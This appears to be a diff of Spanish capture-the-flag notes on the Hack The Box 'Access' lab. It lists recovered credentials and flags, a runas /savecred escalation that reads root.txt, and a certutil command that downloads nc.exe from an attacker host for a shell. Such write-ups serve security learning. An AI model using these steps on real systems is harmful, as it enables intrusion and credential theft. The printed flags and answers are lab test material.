@@ -17,28 +17,37 @@
 https://www.youtube.com/watch?v=rbJGPEppbV0&ab_channel=xerosec
 
 `nmap -p- --min-rate 5000 -sCV -n 10.10.10.98`
+
 ![Pasted image 20241207172420](../../Fotos/Pasted%20image%2020241207172420.png)
 
 Dentro de Backups
+
 ![Pasted image 20241207173630](../../Fotos/Pasted%20image%2020241207173630.png)
+
 ![Pasted image 20241207173749](../../Fotos/Pasted%20image%2020241207173749.png)
 
 Dentro de Enginer
+
 ![Pasted image 20241207173854](../../Fotos/Pasted%20image%2020241207173854.png)
 
 Vemos las tablas
 ![Pasted image 20241207183207](../../Fotos/Pasted%20image%2020241207183207.png)
+
 Vemos las tablas que tienen posiblemente credenciales
+
 ![Pasted image 20241207183010](../../Fotos/Pasted%20image%2020241207183010.png)
+
 ![Pasted image 20241207183159](../../Fotos/Pasted%20image%2020241207183159.png)
 
 `7z x Access\ Control.zip -paccess4u@security`
 Utilizaremos las credenciales obtenidas para descomprimir acceso control que estaba en enginer
+
 ![Pasted image 20241207183504](../../Fotos/Pasted%20image%2020241207183504.png)
 
 ![Pasted image 20241207183623](../../Fotos/Pasted%20image%2020241207183623.png)
 
 `readpst Access\ Control.pst`
+
 ![Pasted image 20241207184238](../../Fotos/Pasted%20image%2020241207184238.png)
 
 `cat Access\ Control.mbox`
@@ -46,6 +55,7 @@ Utilizaremos las credenciales obtenidas para descomprimir acceso control que est
 
 security
 4Cc3ssC0ntr0ller
+
 ![Pasted image 20241207184656](../../Fotos/Pasted%20image%2020241207184656.png)
 
 ![Pasted image 20241207184858](../../Fotos/Pasted%20image%2020241207184858.png)
@@ -60,26 +70,34 @@ user flag: 54720bd41356f5bc363c14c90d718efc
 
 `cmdkey list `
 -  Imprimirá información sobre las credenciales almacenadas disponibles para el usuario actual
+
 ![Pasted image 20241207191533](../../Fotos/Pasted%20image%2020241207191533.png)
 
 `dir /a`
 - Ver directorios ocultos en Windows.
+
 ![Pasted image 20241207191918](../../Fotos/Pasted%20image%2020241207191918.png)
 
 ![Pasted image 20241207192630](../../Fotos/Pasted%20image%2020241207192630.png)
 
 - Sintaxis interesante
+
 `C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe`
 
 *Modificación de sintaxis*
+
 `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\Desktop\root.txt"`
+
 -  Ruta de runas en sistema que alude al acceso de administrator de un archivo que contiene las credenciales en /savecreed, tenemos que indicar que shell vamos a utilizar en este caso cmd.exe ya que estamos en windows y luego aludir a la ruta donde esta el archivo y donde queremos que quede que seria donde si tenemos acceso. el hacer esto no nos pediría contraseña ya que toma la contraseña que esta dentro de /savecreed directamente.
 
 Antes de ejecutar el comando
+
 ![Pasted image 20241229143109](../../Fotos/Pasted%20image%2020241229143109.png)
 
 Despues de ejecutar el comando con **runas**
+
 ![Pasted image 20241229143126](../../Fotos/Pasted%20image%2020241229143126.png)
+
 ![Pasted image 20241229143208](../../Fotos/Pasted%20image%2020241229143208.png)
 
 `Maquina Vulnerada`
@@ -91,11 +109,14 @@ Root Flag: 503b7b920525bb82fb2671781f1555ac
 ![Pasted image 20241229143441](../../Fotos/Pasted%20image%2020241229143441.png)
 
 Montamos un servidor con python
+
 ![Pasted image 20241229143514](../../Fotos/Pasted%20image%2020241229143514.png)
+
 - Todos los archivos de la carpeta access se estan sirviendo por el puerto 80 de la maquina access
 
 Como trabajamos con el protocolo Telnet en el puerto 23 y windows lo que haremos sera cargar el nc.exe con:
 `certutil -f -urlcache http://10.10.14.2/nc.exe nc.exe`
+
 ![Pasted image 20241229144342](../../Fotos/Pasted%20image%2020241229144342.png)
 
 Reciclamos la sintaxis modificada pasada
@@ -113,13 +134,13 @@ Reciclamos la sintaxis modificada pasada
 *Preguntas*
 
 De esta forma podemos ver a que dirección apunta un archivo claramente leyendolo windows.
+
 ![Pasted image 20241207205314](../../Fotos/Pasted%20image%2020241207205314.png)
 
 What Windows command, when given the `/list` option, will print information about the stored credentials available to the current user?
 ¿Qué comando de Windows, cuando se le da la opción /list, imprimirá información sobre las credenciales almacenadas disponibles para el usuario actual?
 `cmdkey`
 
----
 ---
 
 INVESTIGAR MAS SOBRE LAS RUNAS EN WINDOWS
